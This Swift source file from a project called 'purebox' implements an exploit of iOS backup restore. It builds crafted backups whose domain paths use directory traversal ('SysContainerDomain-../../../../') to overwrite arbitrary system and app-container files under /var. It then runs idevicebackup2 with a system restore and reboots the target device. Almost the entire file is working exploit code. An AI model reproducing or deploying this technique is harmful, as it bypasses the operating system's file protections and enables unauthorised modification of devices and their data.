//
//  SparseRestore.swift
//  purebox
//
//  Created by Lrdsnow on 9/13/24.
//

import Foundation

let sparseRestoreLogPipe = Pipe()
var sparseRestoreAppInfo: [AppInfo] = []

class SparseRestore: NSObject {
    
    @objc public static func startExploit(_ json: [String:String]) -> Bool {
        let backupPath = URL.documents.appendingPathComponent("backup")
        let fm = FileManager.default
        
        try? fm.removeItem(at: backupPath)
        try? fm.createDirectory(at: backupPath, withIntermediateDirectories: true)
        
        start_emotional_damage("127.0.0.1:51820")
        
        setvbuf(stdout, nil, _IOLBF, 0)
        setvbuf(stderr, nil, _IONBF, 0)
        
        Task.detached {
            dup2(sparseRestoreLogPipe.fileHandleForWriting.fileDescriptor, fileno(stdout))
            dup2(sparseRestoreLogPipe.fileHandleForWriting.fileDescriptor, fileno(stderr))
        }
        
        let key = URL.documents.appendingPathComponent("imported/PairingFile")
        if let contents = try? String(contentsOf: key),
           !contents.isEmpty {
            target_minimuxer_address()
            do {
                try start(contents, backupPath.absoluteString)
            } catch {
                return false
            }
        }
        
        let deviceList = MobileDevice.deviceList()
        guard deviceList.count == 1 else {
            log("Invalid device count: \(deviceList.count)")
            return false
        }
        let udid = deviceList.first!
        
        while sparseRestoreAppInfo.isEmpty {
            sparseRestoreAppInfo = DeviceManager().getInstalledApps(udid, use_network: true)
        }
        exploitLog += "\(sparseRestoreAppInfo)"
        return true
    }
    
    @objc public static func getAppPath(_ bundleid: String, forOption: String) -> String? {
//        log("GETAPPPATH: <\(bundleid)> <\(forOption)> <\(sparseRestoreAppInfo.first(where: { $0.bundleID == bundleid })?.path)> <\(sparseRestoreAppInfo.first(where: { $0.bundleID == bundleid })?.container)>")
        switch forOption {
        case "Bundle":
            return sparseRestoreAppInfo.first(where: { $0.bundleID == bundleid })?.path
        case "Data":
            return sparseRestoreAppInfo.first(where: { $0.bundleID == bundleid })?.container
        default:
            return nil
        }
    }
    
    @objc public static func overwriteFile(_ from: URL, to: URL) {
        if to.path.contains("/var") {
            let target = URL.documents.appendingPathComponent("temp").appendingPathComponent(to.path)
            let targetDir = target.deletingLastPathComponent()
            try? FileManager.default.createDirectory(at: targetDir, withIntermediateDirectories: true)
            
            try? FileManager.default.copyItem(at: from, to: target)
            
            let backupInfoURL = URL.documents.appendingPathComponent("temp/backup_info.json")
            var backupInfo: [String] = []
            if let data = try? Data(contentsOf: backupInfoURL),
               let existingInfo = try? JSONSerialization.jsonObject(with: data, options: []) as? [String] {
                backupInfo = existingInfo
            }
            backupInfo.append(to.path)
            if let data = try? JSONSerialization.data(withJSONObject: backupInfo, options: .prettyPrinted) {
                try? data.write(to: backupInfoURL)
            }
        }
    }
    
    @objc public static func endExploit() {
        restore()
        print(exploitLog)
        try? exploitLog.write(to: URL.documents.appendingPathComponent("exploitlog.txt"), atomically: true, encoding: String.Encoding.utf8)
    }
    
    public static func restore() {
        let tempBackupDir = URL.documents.appendingPathComponent("temp")
        let backupPath = URL.documents.appendingPathComponent("backup")
        let fm = FileManager.default
        defer { print("done") }
        if fm.fileExists(atPath: tempBackupDir.path) {
            
            start_emotional_damage("127.0.0.1:51820")
            
            setvbuf(stdout, nil, _IOLBF, 0)
            setvbuf(stderr, nil, _IONBF, 0)
            
            Task.detached {
                dup2(sparseRestoreLogPipe.fileHandleForWriting.fileDescriptor, fileno(stdout))
                dup2(sparseRestoreLogPipe.fileHandleForWriting.fileDescriptor, fileno(stderr))
            }
            
            let key = URL.documents.appendingPathComponent("imported/PairingFile")
            if let contents = try? String(contentsOf: key),
               !contents.isEmpty {
                target_minimuxer_address()
                do {
                    try start(contents, backupPath.absoluteString)
                } catch {
                    return
                }
            }
            
            let deviceList = MobileDevice.deviceList()
            guard deviceList.count == 1 else {
                log("Invalid device count: \(deviceList.count)")
                return
            }
            let udid = deviceList.first!
            
            Task.detached {
                sparseRestoreLogPipe.fileHandleForReading.readabilityHandler = { fileHandle in
                    let data = fileHandle.availableData
                    if !data.isEmpty, var logString = String(data: data, encoding: .utf8) {
                        if logString.contains(udid) {
                            logString = logString.replacingOccurrences(of: udid, with: "<redacted>")
                        }
                        exploitLog.append(logString)
                    }
                }
            }
            
            let folder = backupPath.appendingPathComponent(udid, conformingTo: .data)
            
            do {
                try? FileManager.default.removeItem(at: folder)
                try? FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
                
                var backupFiles: [BackupFile] = [
                    Directory(path: "", domain: "RootDomain"),
                    Directory(path: "Library", domain: "RootDomain"),
                    Directory(path: "Library/Preferences", domain: "RootDomain")
                ]
                
                let backupInfoURL = tempBackupDir.appendingPathComponent("backup_info.json")
                var backupInfo: [String] = []
                if let data = try? Data(contentsOf: backupInfoURL),
                   let existingInfo = try? JSONSerialization.jsonObject(with: data, options: []) as? [String] {
                    backupInfo = existingInfo
                }
                let containerBackup = backupInfo.filter({ $0.contains("/containers/") })
                backupInfo = backupInfo.filter({ !$0.contains("/containers/") })
                if backupInfo.count > 0 {
                    for file in backupInfo.indices {
                        let filePath = backupInfo[file]
                        do {
                            let fileContents = try Data(contentsOf: tempBackupDir.appendingPathComponent(filePath))
                            //backupFiles.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../..\(file)", contents: ))
                            let to = URL(fileURLWithPath: filePath)
                            var basePath = "var"
                            if #available(iOS 17.0, *) {
                                basePath = to.path.hasPrefix("/var/mobile/") ? "var/mobile" : "var"
                            }
                            let folderPath = to.deletingLastPathComponent().path.replacingOccurrences(of: "//private/var", with: "/var").replacingOccurrences(of: "/private/var", with: "/var")
                            let targetPath = to.path.replacingOccurrences(of: "//private/var", with: "/var").replacingOccurrences(of: "/private/var", with: "/var")
                            backupFiles += [
                                ConcreteFile(path: "Library/Preferences/temp\(Int(file))", domain: "RootDomain", contents: fileContents, inode: UInt64(file)),
                                Directory(path: "", domain: "SysContainerDomain-../../../../../../../../\(basePath)/backup\(folderPath)", owner: 501, group: 501),
                                ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../\(basePath)/backup\(targetPath)", contents: Data(), owner: 501, group: 501, inode: UInt64(file)),
                                ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../\(basePath)/.backup.i/var/root/Library/Preferences/temp\(Int(file))", contents: Data())
                            ]
                            
                        } catch {}
                    }
                    
                    backupFiles += [
                        ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data())
                    ]
                    
                    //try? fm.removeItem(at: tempBackupDir)
                    let mbdb = Backup(files: backupFiles)
                    try mbdb.writeTo(directory: folder)
                    
                    var restoreArgs = [
                        "idevicebackup2",
                        "-n", "restore", "--no-reboot", "--system",
                        backupPath.path
                    ]
                    log("Executing args: \(restoreArgs)")
                    var argv = restoreArgs.map{ strdup($0) }
                    let result = idevicebackup2_main(Int32(restoreArgs.count), &argv)
                    log("idevicebackup2 exited with code \(result)")
                }
                // Container Code
                for filePath in containerBackup {
                    DispatchQueue.main.async {
                        try SparseRestore.restoreContainerFile(filePath)
                    }
                }
                
                try? FileManager.default.removeItem(at: backupPath)
                try? exploitLog.write(to: URL.documents.appendingPathComponent("exploitlog.txt"), atomically: true, encoding: String.Encoding.utf8)
                guard exploitLog.contains("crash_on_purpose") else { return }

                print("Restore succeeded")
                
                print("rebooting")
                MobileDevice.rebootDevice(udid: udid)

                sparseRestoreLogPipe.fileHandleForReading.readabilityHandler = nil
            } catch {
                log(error.localizedDescription)
                //try? FileManager.default.removeItem(at: tempBackupDir)
                try? FileManager.default.removeItem(at: backupPath)
                return
            }
        }
    }
    
    public static func restoreContainerFile(_ filePath: String) throws {
        let tempBackupDir = URL.documents.appendingPathComponent("temp")
        let backupPath = URL.documents.appendingPathComponent("backup")
        let fm = FileManager.default
        
        start_emotional_damage("127.0.0.1:51820")
        
        let key = URL.documents.appendingPathComponent("imported/PairingFile")
        if let contents = try? String(contentsOf: key),
           !contents.isEmpty {
            target_minimuxer_address()
            do {
                try start(contents, backupPath.absoluteString)
            } catch {
                return
            }
        }
        
        let deviceList = MobileDevice.deviceList()
        guard deviceList.count == 1 else {
            log("Invalid device count: \(deviceList.count)")
            return
        }
        let udid = deviceList.first!
        
        let folder = backupPath.appendingPathComponent(udid, conformingTo: .data)
        
        try? FileManager.default.removeItem(at: backupPath)
        try? FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        
        let fileContents = try Data(contentsOf: tempBackupDir.appendingPathComponent(filePath))
        let to = URL(fileURLWithPath: filePath)
        var basePath = "var"
        if #available(iOS 17.0, *) {
            basePath = to.path.hasPrefix("/var/mobile/") ? "var/mobile" : "var"
        }
        let folderPath = to.deletingLastPathComponent().path.replacingOccurrences(of: "//private/var", with: "/var").replacingOccurrences(of: "/private/var", with: "/var")
        let targetPath = to.path.replacingOccurrences(of: "//private/var", with: "/var").replacingOccurrences(of: "/private/var", with: "/var")
        let containerBackupFiles: [BackupFile] = [
            Directory(path: "", domain: "RootDomain"),
            Directory(path: "Library", domain: "RootDomain"),
            Directory(path: "Library/Preferences", domain: "RootDomain"),
            ConcreteFile(path: "Library/Preferences/temp", domain: "RootDomain", contents: fileContents, owner: 33, group: 33, inode: 0),
            Directory(path: "", domain: "SysContainerDomain-../../../../../../../../\(basePath)/backup\(folderPath)", owner: 33, group: 33),
            ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../\(basePath)/backup\(targetPath)", contents: Data(), owner: 501, group: 501, inode: 0),
            ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../\(basePath)/.backup.i/var/root/Library/Preferences/temp", contents: Data())
        ]
        let mbdb = Backup(files: containerBackupFiles)
        try mbdb.writeTo(directory: folder)
        
        var restoreArgs = [
            "idevicebackup2",
            "-n", "restore", "--no-reboot", "--system",
            backupPath.path
        ]
        log("Executing args: \(restoreArgs)")
        var argv = restoreArgs.map{ strdup($0) }
        let result = idevicebackup2_main(Int32(restoreArgs.count), &argv)
        log("idevicebackup2 exited with code \(result)")
    }
}
